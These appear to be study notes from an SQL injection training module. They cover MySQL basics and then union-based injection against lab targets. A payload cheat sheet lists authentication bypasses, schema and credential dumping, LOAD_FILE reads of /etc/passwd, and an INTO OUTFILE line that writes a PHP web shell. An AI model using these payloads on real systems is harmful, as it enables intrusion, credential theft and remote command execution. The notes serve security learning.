# SQLi

## Database Management Systems (DBMS)

| **Feature** | **Description** |
| --- | --- |
| `Concurrency` | A real-world application might have multiple users interacting with it simultaneously. A DBMS makes sure that these concurrent interactions succeed without corrupting or losing any data. |
| `Consistency` | With so many concurrent interactions, the DBMS needs to ensure that the data remains consistent and valid throughout the database. |
| `Security` | DBMS provides fine-grained security controls through user authentication and permissions. This will prevent unauthorized viewing or editing of sensitive data. |
| `Reliability` | It is easy to backup databases and rolls them back to a previous state in case of data loss or a breach. |
| `Structured Query Language` | SQL simplifies user interaction with the database with an intuitive syntax supporting various operations. |

![image.png](image%2018.png)

**`Tier I`** usually consists of client-side applications such as websites or GUI programs. These applications consist of high-level interactions such as user login or commenting. The data from these interactions is passed to **`Tier II`** through API calls or other requests.

## Types of DataBases

### Relational Databases

- **Definition**: Use structured schemas and tables to store data in a structured format.
- **Schema**: Defines data structure, helping organize tables in a predictable layout.
- **Tables and Keys**: Tables (entities) are linked with **keys** for easy access and retrieval:
    - **Primary Key**: Unique identifier for each row.
    - **Foreign Key**: Links tables together.
- **RDBMS (Relational Database Management System)**: A system to manage these relational connections, examples include:
    - **`Microsoft Access`**
    - **`MySQL`**
    - **`SQL Server`**
    - **`Oracle`**
    - **`PostgreSQL`**
- **Example of Relational Tables**:
    
    ```sql
    Users Table:
    - id
    - username
    - first_name
    - last_name
    
    Posts Table:
    - id
    - user_id
    - date
    - content
    ```
    
    - **Schema**: The structure describing how tables relate to each other.
    - **Advantages**: Allows efficient querying, data retrieval, and management with large datasets.

![image.png](image%2019.png)

---

### Non-Relational Databases (NoSQL Databases)

- **Definition**: Do not use traditional table structures or schemas. Instead, they rely on flexible storage models suitable for unstructured data.
- **Models**:
    - **Key-Value**: Stores data as key-value pairs (e.g., JSON or XML).
    - **Document-Based**: Stores data in documents, commonly JSON format.
    - **Wide-Column**: Uses tables but with columns that can vary for each row.
    - **Graph**: Stores data as nodes and edges, emphasizing relationships.

![image.png](image%2020.png)

- **Example of Key-Value Model in JSON**:
    
    ```json
    {
      "100001": {
        "date": "01-01-2021",
        "content": "Welcome to this web application."
      },
      "100002": {
        "date": "02-01-2021",
        "content": "This is the first post on this web app."
      },
      "100003": {
        "date": "02-01-2021",
        "content": "Reminder: Tomorrow is the ..."
      }
    }
    
    ```
    
- **Common Non-Relational Databases**: MongoDB
- **Injection Attacks**: Non-relational databases are susceptible to **NoSQL injection attacks**, different from traditional SQL injections.

# MySQL

### Common SQL Commands

SQL can be used for:

- Retrieving, updating, and deleting data.
- Creating new tables and databases.
- Adding/removing users and assigning permissions.

---

### Using MySQL from the Command Line

- **Command Format**:
    
    ```bash
    mysql -u <username> -p
    ```
    
    - `u`: Username
    - `p`: Prompts for password (recommended to avoid storing in cleartext).
- **Example**:
    
    ```bash
    mysql -u root -p
    ```
    
- **Specifying Host and Port**:
    
    ```bash
    mysql -u root -h <hostname> -P <port> -p
    ```
    
    - Default port for MySQL/MariaDB is `3306`.

---

### Database Creation and Management

1. **Creating a Database**:
    
    ```sql
    CREATE DATABASE users;
    ```
    
2. **Viewing Databases**:
    
    ```sql
    SHOW DATABASES;
    ```
    
3. **Using a Database**:
    
    ```sql
    USE user
    ```
    
    - SQL statements are not case-sensitive, but database and table names are.

---

### Working with Tables

Tables store data in rows and columns, with **columns** having specific **data types** (e.g., `INT`, `VARCHAR`, `DATETIME`).

1. **Creating a Table**:
    
    ```sql
    CREATE TABLE logins (
        id INT,
        username VARCHAR(100),
        password VARCHAR(100),
        date_of_joining DATETIME
    );
    ```
    
2. **Viewing Tables in a Database**:
    
    ```sql
    SHOW TABLES;
    ```
    
3. **Describing a Table Structure**:
    
    ```sql
    DESCRIBE logins;
    ```
    

---

### Table and Column Properties

https://dev.mysql.com/doc/refman/8.0/en/create-table.html

- **AUTO_INCREMENT**: Automatically increases a column value by one with each new row.
    
    ```sql
    id INT NOT NULL AUTO_INCREMENT
    ```
    
- **NOT NULL**: Ensures a column cannot have a `NULL` (empty) value.
- **UNIQUE**: Prevents duplicate entries in a column (e.g., `username`).
    
    ```sql
    username VARCHAR(100) UNIQUE NOT NULL,
    ```
    
- **DEFAULT**: Sets a default value for a column.
    
    ```sql
    date_of_joining DATETIME DEFAULT NOW(),
    ```
    
- **PRIMARY KEY**: Designates a column as the unique identifier for each row.
    
    ```sql
    PRIMARY KEY (id)
    ```
    
    - **Reading a specific item within a table:**
    
    ```sql
    MariaDB [employees]> DESCRIBE departments;
    +-----------+-------------+------+-----+---------+-------+
    | Field     | Type        | Null | Key | Default | Extra |
    +-----------+-------------+------+-----+---------+-------+
    | dept_no   | char(4)     | NO   | PRI | NULL    |       |
    | dept_name | varchar(40) | NO   | UNI | NULL    |       |
    +-----------+-------------+------+-----+---------+-------+
    2 rows in set (0.004 sec)
    
    MariaDB [employees]> SELECT dept_no FROM departments;
    +---------+
    | dept_no |
    +---------+
    | d001    |
    | d002    |
    | d003    |
    | d004    |
    | d005    |
    | d006    |
    | d007    |
    | d008    |
    | d009    |
    +---------+
    9 rows in set (0.005 sec)
    
    MariaDB [employees]> SELECT dept_name FROM departments;
    +--------------------+
    | dept_name          |
    +--------------------+
    | Customer Service   |
    | Development        |
    | Finance            |
    | Human Resources    |
    | Marketing          |
    | Production         |
    | Quality Management |
    | Research           |
    | Sales              |
    +--------------------+
    9 rows in set (0.003 sec)
    
    ```
    

### Final Table Creation Query Example

The following query creates a `logins` table with key properties set:

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
);
```

This defines:

- `id` as an auto-incrementing integer primary key.
- `username` as unique and non-null.
- `password` as non-null.
- `date_of_joining` as a `DATETIME` column with the default value as the current date and time.

## Query Results in MySQL

### Sorting Results

- **ORDER BY**: Sorts query results by a specified column.
    - By default, sorting is **ascending**.
    - **Ascending (ASC)** or **Descending (DESC)** can be specified.
    
    ```sql
    SELECT * FROM logins ORDER BY password;        -- Ascending
    SELECT * FROM logins ORDER BY password DESC;    -- Descending
    ```
    
- **Multiple Columns**: Allows secondary sorting if values in the first column are duplicated.
    
    ```sql
    SELECT * FROM logins ORDER BY password DESC, id ASC;
    ```
    

### Limiting Results

- **LIMIT**: Restricts the number of returned records.
    
    ```sql
    SELECT * FROM logins LIMIT 2;
    ```
    
- **OFFSET with LIMIT**: Specifies starting position and number of rows to return.
    
    ```sql
    SELECT * FROM logins LIMIT 1, 2;  -- Starts at 2nd record and returns 2 rows
    ```
    

### Filtering Results

### WHERE Clause

- Filters results to only those meeting a specific condition.
    
    ```sql
    SELECT * FROM logins WHERE id > 1;
    ```
    
- **Example**: Selecting a specific username.
    
    ```sql
    SELECT * FROM logins WHERE username = 'admin';
    ```
    
    - **Note**: Use single (`'`) or double (`"`) quotes for strings and dates; numbers do not require quotes.

### LIKE Clause

- **LIKE**: Matches patterns within text data.
    - **%**: Wildcard matching zero or more characters.
    - **_**: Wildcard matching exactly one character.
    
    ```sql
    SELECT * FROM logins WHERE username LIKE 'admin%';  -- Matches 'admin' and 'administrator'
    SELECT * FROM logins WHERE username LIKE '___';     -- Matches usernames with exactly 3 characters (e.g., 'tom')
    ```
    

These commands help filter, sort, and manage the output of queries for efficient data handling in MySQL.

## SQL Operators

SQL supports **logical operators** to enable using multiple conditions within queries. Common operators include **AND**, **OR**, and **NOT**.

### AND Operator

- Combines two conditions and returns `TRUE` only if **both conditions** are `TRUE`.
    
    ```sql
    condition1 AND condition2
    ```
    
    - **Example**:
        
        ```sql
        SELECT 1 = 1 AND 'test' = 'test';   -- Returns 1 (TRUE)
        SELECT 1 = 1 AND 'test' = 'abc';    -- Returns 0 (FALSE
        ```
        

### OR Operator

- Returns `TRUE` if **at least one condition** is `TRUE`.
    
    ```sql
    condition1 OR condition2
    ```
    
    - **Example**:
        
        ```sql
        SELECT 1 = 1 OR 'test' = 'abc';     -- Returns 1 (TRUE)
        SELECT 1 = 2 OR 'test' = 'abc';     -- Returns 0 (FALSE
        ```
        

### NOT Operator

- Inverts the `TRUE` or `FALSE` value of a condition.
    
    ```sql
    NOT condition
    ```
    
    - **Example**:
        
        ```sql
        SELECT NOT 1 = 1;  -- Returns 0 (FALSE)
        SELECT NOT 1 = 2;  -- Returns 1 (TRUE)
        ```
        

---

### Symbolic Representations of Operators

- **AND**: `&&`
- **OR**: `||`
- **NOT**: `!`
    
    ```sql
    SELECT 1 = 1 && 'test' = 'abc';  -- Returns 0 (FALSE)
    SELECT 1 = 1 || 'test' = 'abc';  -- Returns 1 (TRUE)
    SELECT 1 != 1;                   -- Returns 0 (FALSE)
    ```
    

---

### Operators in Queries

- **Example 1**: Selects records where the username is **not** `'john'`.
    
    ```sql
    SELECT * FROM logins WHERE username != 'john';
    ```
    
- **Example 2**: Selects users with `id > 1` and username **not equal** to `'john'`.
    
    ```sql
    SELECT * FROM logins WHERE username != 'john' AND id > 1;
    ```
    

---

### Operator Precedence

Operator precedence defines the order of operations:

1. Division (`/`), Multiplication (), Modulus (`%`)
2. Addition (`+`) and Subtraction ()
3. Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
4. NOT (`!`)
5. AND (`&&`)
6. OR (`||`)
- Operations at the top are evaluated **before** those below.
- **Example**:
    
    ```sql
    SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
    ```
    
    - **Breakdown**:
        1. `3 - 2` is evaluated first (result: `1`).
        2. Next, conditions `username != 'tom'` and `id > 1` are evaluated.
        3. Both conditions are combined with `AND`.

Example: In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?

```sql
SELECT * FROM titles WHERE emp_no > 1000 || title != 'engineer';
```

# SQL Injections

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

| **Payload** | **Description** |
| --- | --- |
| **Auth Bypass** |  |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |  |
| **Union Injection** |  |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** |  |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** |  |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find if all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** |  |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

---

### Use of SQL in Web Applications

- **Web Applications & Databases**: Web applications use databases like MySQL to store and retrieve data.
- **Example in PHP**: A PHP application can use MySQL commands to interact with the database.
    
    ```php
    $conn = new mysqli("localhost", "root", "password", "users");
    $query = "SELECT * FROM logins";
    $result = $conn->query($query);
    ```
    

### SQL Queries with User Input

- Applications often use **user input** within SQL queries.
    
    ```php
    $searchInput = $_POST['findUser'];
    $query = "SELECT * FROM logins WHERE username LIKE '%$searchInput'";
    $result = $conn->query($query)
    ```
    
- **Risk**: If user input is directly embedded in SQL queries without **sanitization**, it can lead to **SQL injection vulnerabilities**.

---

### What is an Injection?

- **Injection**: Occurs when user input is misinterpreted as executable code, allowing for unintended code execution.
    - **Sanitization**: Removing or escaping special characters in user input to prevent injection.

### SQL Injection

- An **SQL Injection** happens when unsanitized user input is included directly in SQL queries.
    - Example:
        
        ```php
        $searchInput = $_POST['findUser'];
        $query = "SELECT * FROM logins WHERE username LIKE '%$searchInput'";
        ```
        
    - If `$searchInput` is set to `"1'; DROP TABLE users;"`, the query becomes:
    This input can alter the query’s intended function, potentially causing destructive actions (e.g., table deletion).
        
        ```sql
        SELECT * FROM logins WHERE username LIKE '%1'; DROP TABLE users;'
        ```
        

### SQL Injection Limitations

- **Syntax Errors**: Improperly injected SQL code can cause syntax errors if quotes or semicolons are unmatched.
    - Example Error: `Error: near line 1: near "'": syntax error`
- **Solution**: Using comments or manipulating quotes to maintain valid syntax.

---

### Types of SQL Injections

![image.png](image%2021.png)

SQL Injections can be classified based on how and where the injected query output is retrieved.

1. **In-band SQL Injection**
    - **Union-Based Injection**: Uses the `UNION` operator to combine injected results with legitimate query results. Useful when output appears directly in the application.
    - **Error-Based Injection**: Causes deliberate errors to reveal database information through error messages.
2. **Blind SQL Injection**
    - **Boolean-Based**: Uses conditional SQL logic (e.g., `WHERE 1=1`) to control output visibility on the page.
    - **Time-Based**: Uses conditional statements with delays (e.g., `SLEEP()`) to infer database response based on timing.
3. **Out-of-Band SQL Injection**
    - Used when direct output access isn’t possible. Injected code sends the output to an external location, such as a DNS server.

> Note: This module will focus on Union-Based SQL injection as an introductory method.
> 

## SQLi Discovery

| **Payload** | **URL Encoded** |
| --- | --- |
| `'` | `%27` |
| `"` | `%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |

Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.

![image.png](image%2022.png)

We see that a SQL error was thrown instead of the `Login Failed` message. The page threw an error because the resulting query was:

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

## OR Injection

We would need the query always to return true, regardless of the username and password entered, to bypass the authentication. To do this, we can abuse the OR operator in our SQL injection.

An example of a condition that will always return `true` is `'1'='1'`. However, to keep the SQL query working and keep an even number of quotes, instead of using ('1'='1'), we will remove the last quote and use ('1'='1), so the remaining single quote from the original query would be in its place.

So, if we inject the below condition and have an `OR` operator between it and the original condition, it should always return `true`:

```sql
admin' or '1'='1
# Final query:
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

This means the following:

- If username is `adminOR`
- If `1=1` return `true` 'which always returns `true`'`AND`
- If password is `something`

![image.png](image%2023.png)

The `AND` operator will be evaluated first, and it will return `false`. Then, the `OR` operator would be evalutated, and if either of the statements is `true`, it would return `true`. Since `1=1` always returns `true`, this query will return `true`, and it will grant us access.

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

### Auth Bypass with OR operator

![image.png](image%2024.png)

We were able to log in successfully as admin. However, what if we did not know a valid username? Let us try the same request with a different username this time.

![image.png](image%2025.png)

The login failed because `notAdmin` does not exist in the table and resulted in a false query overall.

![image.png](image%2026.png)

To successfully log in once again, we will need an overall `true` query. This can be achieved by injecting an `OR` condition into the password field, so it will always return `true`. Let us try `something' or '1'='1` as the password.

![image.png](image%2027.png)

The additional `OR` condition resulted in a `true` query overall, as the `WHERE` clause returns everything in the table, and the user present in the first row is logged in. In this case, as both conditions will return `true`, we do not have to provide a test username and password and can directly start with the `'` injection and log in with just `' or '1' = '1`.

![image.png](image%2028.png)

## Using Comments

Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL `--` and `#`, in addition to an in-line comment `/**/` (though this is not usually used in SQL injections). The `--` can be used as follows:

```sql
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
4 rows in set (0.00 sec)
```

The `#` symbol can be used as well.

```sql
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

> Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.
> 

### Auth Bypass with Comments

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

As we can see from the syntax highlighting, the username is now `admin`, and the remainder of the query is now ignored as a comment. Also, this way, we can ensure that the query does not have any syntax issues.

Let us try using these on the login page, and log in with the username `admin'--` and anything as the password:

![image.png](image%2029.png)

### Another example of Auth Bypass

Let us look at a scenario like this:

![image.png](image%2030.png)

The above query ensures that the user's id is always greater than 1, which will prevent anyone from logging in as admin. Additionally, we also see that the password was hashed before being used in the query. This will prevent us from injecting through the password field because the input is changed to a hash.

Let us try logging in with valid credentials `admin / p@ssw0rd` to see the response.

![image.png](image%2031.png)

As expected, the login failed even though we supplied valid credentials because the admin’s ID equals 1. So let us try logging in with the credentials of another user, such as `tom`.

![image.png](image%2032.png)

Logging in as the user with an id not equal to 1 was successful. So, how can we log in as the admin? We know from the previous section on comments that we can use them to comment out the rest of the query. So, let us try using `admin'--` as the username.

![image.png](image%2033.png)

The login failed due to a syntax error, as a closed one did not balance the open parenthesis. To execute the query successfully, we will have to add a closing parenthesis. Let us try using the username `admin')--` to close and comment out the rest.

![image.png](image%2034.png)

The query was successful, and we logged in as admin. The final query as a result of our input is:

```sql
SELECT * FROM logins where (username='admin')
```

## Union Clause & Union-Based SQL Injection

So far, we have only been manipulating the original query to subvert the web application logic and bypass authentication, using the `OR` operator and comments. However, another type of SQL injection is injecting entire SQL queries executed along with the original query. This section will demonstrate this by using the MySQL `Union` clause to do `SQL Union Injection`.

The `UNION` clause in SQL is used to combine results from multiple `SELECT` statements. This is particularly useful in SQL injection when injecting entire SQL queries to manipulate database outputs.

### Basic SQL `UNION` Operation

1. **Purpose**: Combines results from multiple `SELECT` statements into one result set.
2. **Example**:
    
    ```sql
    SELECT * FROM ports;
    -- Output:
    -- | code  | city      |
    -- |-------|-----------|
    -- | CN SHA| Shanghai  |
    -- | SG SIN| Singapore |
    -- | ZZ-21 | Shenzhen  
    ```
    
    ```sql
    SELECT * FROM ships;
    -- Output:
    -- | Ship     | city      |
    -- |----------|-----------|
    -- | Morrison | New York  |
    ```
    
    ```sql
    SELECT * FROM ports UNION SELECT * FROM ships;
    -- Combined Output:
    -- | code     | city      |
    -- |----------|-----------|
    -- | CN SHA   | Shanghai  |
    -- | SG SIN   | Singapore |
    -- | Morrison | New York  |
    -- | ZZ-21    | Shenzhen  |
    ```
    

### Key Points

- **Equal Columns**: The `UNION` clause requires the `SELECT` statements to have the same number of columns and matching data types.
    - Example of error due to unequal columns:
        
        ```sql
        SELECT city FROM ports UNION SELECT * FROM ships;
        -- Error: The used SELECT statements have a different number of columns
        ```
        

**SQL Injection Using `UNION`**

### Basic Injection Example

To exploit an SQL injection vulnerability using the `UNION` clause:

- Original query:
    
    ```sql
    SELECT * FROM products WHERE product_id = 'user_input'
    ```
    
- Injected payload:
    
    ```sql
    SELECT * FROM products WHERE product_id = '1' UNION SELECT username, password FROM passwords-- ';
    ```
    
    - Combines results from `products` table and `passwords` table.

### Handling Column Mismatch

1. If the original query has fewer/more columns, "junk" data can be used to match the required number of columns.
    - Example of filling extra columns with dummy data:
        
        ```sql
        SELECT * FROM products WHERE product_id = '1' UNION SELECT username, 2 FROM passwords;
        ```
        
    - Use `NULL` for compatibility across all data types:
        
        ```sql
        UNION SELECT username, NULL FROM passwords
        ```
        
2. If the original query had four columns:
    
    ```sql
    UNION SELECT username, 2, 3, 4 FROM passwords-- ';
    ```
    
    - Example output:
        
        ```
        | product_1 | product_2 | product_3 | product_4 |
        |-----------|-----------|-----------|-----------|
        | admin     | 2         | 3         | 4         |
        ```
        

### Tips for Advanced SQL Injection

- Use `NULL` to fill columns of unknown data type.
- Track payload positions using numbers to identify which part of the injection matches the database response.

```sql
MariaDB [employees]> DESCRIBE employees;
+------------+---------------+------+-----+---------+-------+                                                                                                        
| Field      | Type          | Null | Key | Default | Extra |                                                                                                        
+------------+---------------+------+-----+---------+-------+                                                                                                        
| emp_no     | int(11)       | NO   | PRI | NULL    |       |                                                                                                        
| birth_date | date          | NO   |     | NULL    |       |                                                                                                        
| first_name | varchar(14)   | NO   |     | NULL    |       |                                                                                                        
| last_name  | varchar(16)   | NO   |     | NULL    |       |                                                                                                        
| gender     | enum('M','F') | NO   |     | NULL    |       |                                                                                                        
| hire_date  | date          | NO   |     | NULL    |       |                                                                                                        
+------------+---------------+------+-----+---------+-------+                                                                                                        
6 rows in set (0.004 sec)

MariaDB [employees]> DESCRIBE departments;
+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| dept_no   | char(4)     | NO   | PRI | NULL    |       |
| dept_name | varchar(40) | NO   | UNI | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows in set (0.004 sec)

MariaDB [employees]> SELECT COUNT(*) FROM (
    ->     SELECT emp_no, birth_date, first_name, last_name, gender, hire_date FROM employees
    ->     UNION
    ->     SELECT dept_no, dept_name, NULL, NULL, NULL, NULL FROM departments
    -> ) AS combined_result;
+----------+
| COUNT(*) |
+----------+
|      663 |
+----------+
1 row in set (0.007 sec)
```

1. The first `SELECT` comes from the `employees` table with all 6 original columns.
2. The second `SELECT` from the `departments` table uses:
    - `dept_no` and `dept_name` for the first two columns.
    - `NULL` placeholders for the remaining four columns to match the `employees` table column count.

This query should execute without errors and provide the total count of records returned from the `UNION` of the two tables.

## Union Injection

![image.png](image%2035.png)

We see a potential SQL injection in the search parameters. We apply the SQLi Discovery steps by injecting a single quote (`'`), and we do get an error:

![image.png](image%2036.png)

Since we caused an error, this may mean that the page is vulnerable to SQL injection. This scenario is ideal for exploitation through Union-based injection, as we can see our queries' results.

### Detect number of columns

Before going ahead and exploiting Union-based queries, we need to find the number of columns selected by the server. There are two methods of detecting the number of columns:

- Using `ORDER BY`
- Using `UNION`

**`Using ORDER BY:`** 

For example, we can start with `order by 1`, sort by the first column, and succeed, as the table must have at least one column. Then we will do `order by 2` and then `order by 3` until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.

If we failed at `order by 4`, this means the table has three columns, which is the number of columns we were able to sort by successfully. Let us go back to our previous example and attempt the same, with the following payload:

```sql
' order by 1-- -
' order by 2-- -
```

it's important to know that there is a space at the end after --

We do the same for column `3` and `4` and get the results back. However, when we try to `ORDER BY` column 5, we get the following error:

![image.png](image%2037.png)

This means that this table has exactly 4 columns .

**`Using UNION:`**

The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. We can start by injecting a 3 column `UNION` query:

```sql
cn' UNION select 1,2,3-- 
```

We get:

![image.png](image%2038.png)

So, let’s try four columns and see the response:

```sql
cn' UNION select 1,2,3,4-- 
```

![image.png](image%2039.png)

This time we successfully get the results, meaning once again that the table has 4 columns.

### Location of Injection

Determining Visible Columns for `UNION` SQL Injection

When performing a `UNION`-based SQL injection, the web application may not display all columns returned by the query. Identifying which columns are visible is crucial to knowing where to inject data and see the output.

### Strategy: Using Numbered Junk Data

By injecting numerical placeholders (like `1, 2, 3, 4`), it's easy to determine which columns are displayed on the page:

- If columns `2`, `3`, and `4` appear on the web page, but `1` does not, it indicates that only columns `2`, `3`, and `4` are visible.
- This tells the attacker to focus their payload injection on those visible columns.

### Example: Testing for Visible Columns

An injection test to check which columns are displayed:

```sql
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, 2, 3, 4-- -
```

- Replace `2` or any number with a different query to see if it's displayed.

### Using `@@version` for Testing

Once visible columns are identified, you can test if actual database data is displayed by injecting a query like `@@version` in a visible column:

```sql
http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, @@version, 3, 4-- -
```

- If the page displays the database version, the injection is successful, confirming which columns are visible for future payloads.

- If we want to search for user() for example we can do :

```sql
' UNION SELECT 1, user(), 3, 4--
```

**Key Takeaways**

1. **Identify Visible Columns**: Inject numbers to see which ones get displayed. Only inject in columns that are visible on the web page.
2. **Use Known Data for Testing**: Use `@@version` or similar to test if you can extract data from the database, not just numbers.
3. **Plan Payloads Accordingly**: Only place the final payload in columns confirmed to be visible.

The next phase involves enumerating the database further to extract more data, targeting visible columns confirmed in the test phase.

# Database Enumeration

In this document, we discuss database enumeration using SQL queries and SQL injections to extract data from a database. Below are the key concepts, steps, and SQL queries covered.

## 1. MySQL Fingerprinting

### Purpose:

To identify the type of DBMS in use, as each DBMS requires specific queries.

### Common Fingerprinting Techniques:

| Payload | When to Use | Expected Output | Wrong Output |
| --- | --- | --- | --- |
| `SELECT @@version` | Full query output available | MySQL Version (e.g., `10.3.22-MariaDB-1ubuntu1`) | MSSQL version or errors with other DBMS |
| `SELECT POW(1,1)` | Numeric output only | 1 | Error with other DBMS |
| `SELECT SLEEP(5)` | Blind/No Output | Delays response by 5 seconds | No delay with other DBMS |

### Example:

```
http://SERVER_IP:PORT/search.php?port_code=cn
```

Output: `10.3.22-MariaDB-1ubuntu1` confirms the database is MariaDB (similar to MySQL).

## 2. INFORMATION_SCHEMA Database

The `INFORMATION_SCHEMA` database contains metadata about the databases and tables on the server. This information helps in forming `SELECT` queries to extract data.

### Key Enumeration Steps:

### a. **Database Enumeration**

To list available databases:

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Example Output:

```
+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------
```

- Default databases (e.g., `mysql`, `information_schema`) are often ignored.
- Using SQL Injection for database enumeration:

```sql
cn' UNION select 1, schema_name, 3, 4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

### b. **Find Current Database**

To identify the database used by the web application:

```sql
cn' UNION select 1, database(), 2, 3-- -
```

- Example result: `ilfreight`.

### c. **Table Enumeration**

To find tables in a specific database (e.g., `dev`):

```sql
cn' UNION select 1, TABLE_NAME, TABLE_SCHEMA, 4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

- Example Output: `credentials`, `framework`, `pages`, `posts`.

### d. **Column Enumeration**

To list columns in a specific table (e.g., `credentials`):

```sql
c' UNION select 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

- Example result: `username`, `password`.

## 3. Data Extraction

Once tables and columns are identified, data can be extracted. Example:

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

- This retrieves `username` and `password` columns from the `credentials` table in the `dev` database.

By leveraging SQL injections and understanding how to query the `INFORMATION_SCHEMA`, we can systematically enumerate databases, tables, and columns, eventually leading to data extraction.

---

For example:

What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?

```sql
c' UNION SELECT 1, password, 3, 4 FROM ilfreight.users WHERE username='newuser'-- 
```

---

# Reading Files

## Privileges

Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in `MySQL`, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files. 

### DB User

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Union payload will be :

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

or

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

![image.png](image%2040.png)

### User Priveleges

Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

```sql
SELECT super_priv FROM mysql.user

-- Payload -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -

-- If we had many users within the DBMS, we can add WHERE user="root" to only show privileges for our current user root:

cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

![image.png](image%2041.png)

The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

From here, we can add `WHERE grantee="'root'@'localhost'"` to only show our current user `root` privileges. Our payload would be:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

![image.png](image%2042.png)

## LOAD_FILE

Now that we know we have enough privileges to read local system files, let us do that using the `LOAD_FILE()` function. The [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the `/etc/passwd` file:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

